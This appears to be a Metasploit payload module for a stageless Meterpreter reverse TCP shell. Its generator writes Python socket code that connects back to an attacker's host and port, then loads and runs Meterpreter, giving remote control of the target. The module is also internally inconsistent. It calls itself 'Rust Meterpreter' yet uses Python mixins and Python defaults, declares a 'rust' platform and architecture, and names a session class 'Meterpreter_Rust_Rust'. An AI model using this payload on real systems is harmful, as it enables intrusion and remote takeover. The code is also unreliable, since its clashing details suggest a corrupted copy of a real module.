##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/python'
require 'msf/core/payload/python/meterpreter_loader'
require 'msf/core/payload/python/reverse_tcp'
require 'msf/base/sessions/meterpreter_python'

require 'msf/base/sessions/meterpreter_rust'

module MetasploitModule

  CachedSize = 71845

  # The payload generation is out of band, use python's defaults for now
  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseTcp
  include Msf::Payload::Python::MeterpreterLoader

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Rust Meterpreter Shell, Reverse TCP Inline',
      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'rust',
      'Arch'        => ARCH_RUST,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_Rust_Rust
    ))
  end

  def generate_reverse_tcp(opts={})
    socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
    socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
    opts[:stageless_tcp_socket_setup] = socket_setup
    opts[:stageless] = true

    met = stage_meterpreter(opts)
    py_create_exec_stub(met)
  end
end
